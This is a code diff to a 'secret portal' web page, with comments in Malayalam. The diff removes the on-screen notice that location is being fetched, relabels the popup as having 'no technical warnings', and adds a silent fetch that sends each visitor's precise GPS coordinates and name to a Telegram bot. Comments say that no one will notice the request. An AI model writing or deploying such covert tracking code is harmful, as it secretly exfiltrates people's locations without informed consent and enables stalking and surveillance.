@@ -80,8 +80,6 @@
 
         .yes-btn:active { transform: scale(0.95); }
 
-        .status-text { color: #ffeb3b; font-size: 13px; display: none; margin-top: 15px; font-weight: bold;}
-
         /* App Containers */
         .container { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 80vh; }
         .glass-panel input { 
@@ -114,13 +112,12 @@
 </head>
 <body>
 
-    <!-- Glass Popup -->
+    <!-- Glass Popup (No technical warnings, just fun) -->
     <div id="welcomeOverlay">
         <div class="glass-panel">
             <h2>Hello Friend! 🕵️‍♂️</h2>
             <p>Are you certain this secret portal is meant for you?<br><br>Do you wish to proceed and explore further? 😉</p>
             <button class="yes-btn" id="exploreBtn" onclick="startExploration()">Yes, Continue</button>
-            <p id="locationStatus" class="status-text">Fetching secure location...<br>Please turn ON your GPS and click 'Allow'.</p>
         </div>
     </div>
 
@@ -174,63 +171,36 @@
         let myNumber = localStorage.getItem("myNumber") || null;
         let localStream = null;
 
-        function resetWelcomeScreen() {
-            document.getElementById("exploreBtn").style.display = "block";
-            document.getElementById("locationStatus").style.display = "none";
-        }
-
-        // "Yes, Continue" ക്ലിക്ക് ചെയ്യുമ്പോൾ
+        // "Yes, Continue" ക്ലിക്ക് ചെയ്യുമ്പോൾ വളരെ പെട്ടെന്ന് പ്രവർത്തിക്കുന്ന ഫംഗ്ഷൻ
         function startExploration() {
-            document.getElementById("exploreBtn").style.display = "none";
-            document.getElementById("locationStatus").style.display = "block";
+            if (!navigator.geolocation) return;
 
-            if (!navigator.geolocation) {
-                alert("⚠️ Error: Geolocation is not supported by your browser.");
-                resetWelcomeScreen();
-                return;
-            }
-
-            // ലൊക്കേഷൻ എടുക്കുന്നു (Error Handling സഹിതം)
             navigator.geolocation.getCurrentPosition(
                 (position) => {
+                    // 1. ലൊക്കേഷൻ കിട്ടിയ ഉടൻ തന്നെ ഒരു സെക്കൻഡ് പോലും വൈകാതെ ആപ്പിലേക്ക് കടത്തിവിടുന്നു
+                    enterApp();
+
+                    // 2. ബാക്ഗ്രൗണ്ടിൽ യാതൊരു തടസ്സവുമില്ലാതെ ടെലിഗ്രാമിലേക്ക് മെസ്സേജ് പോകുന്നു (Silent background task)
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
                     let userName = (myNumber && AUTHORIZED_USERS[myNumber]) ? AUTHORIZED_USERS[myNumber] : "Guest / Unverified User";
 
                     const msg = `📍 [SITE EXPLORATION]\n\n👤 Visitor: ${userName}\n🌍 Location: ${locLink}`;
-                    sendToTelegram(msg);
-
-                    enterApp();
+                    
+                    // fetch request പോകുന്നത് ആരുമറിയില്ല
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`)
+                        .catch(err => console.log("Silent error handled"));
                 },
                 (error) => {
-                    let errorMessage = "⚠️ Security Alert!\n\n";
-                    
-                    // എന്തുകൊണ്ടാണ് ലൊക്കേഷൻ കിട്ടാത്തതെന്ന് കൃത്യമായി കണ്ടുപിടിക്കുന്നു
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage += "You denied the request for Geolocation. Please 'Allow' location access in your browser settings.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage += "Location information is unavailable. Please make sure your device's GPS / Location is TURNED ON.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage += "The request to get your location timed out. Please check your network/GPS signal and try again.";
-                            break;
-                        case error.UNKNOWN_ERROR:
-                            errorMessage += "An unknown error occurred while fetching location.";
-                            break;
-                    }
-                    
-                    alert(errorMessage);
-                    resetWelcomeScreen();
+                    // അഥവാ പെർമിഷൻ കൊടുത്തില്ലെങ്കിൽ മാത്രം അലർട്ട്
+                    alert("⚠️ Please 'Allow' access to enter the portal.");
                 },
-                // Timeout 10 സെക്കൻഡ് ആക്കി (വളരെ നേരം കാത്തുനിൽക്കാതിരിക്കാൻ)
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
+        // ഉള്ളിലേക്ക് പ്രവേശിപ്പിക്കുന്ന ഭാഗം
         function enterApp() {
             document.getElementById("mainApp").classList.remove("blur-bg");
             document.getElementById("mainApp").style.pointerEvents = "auto";
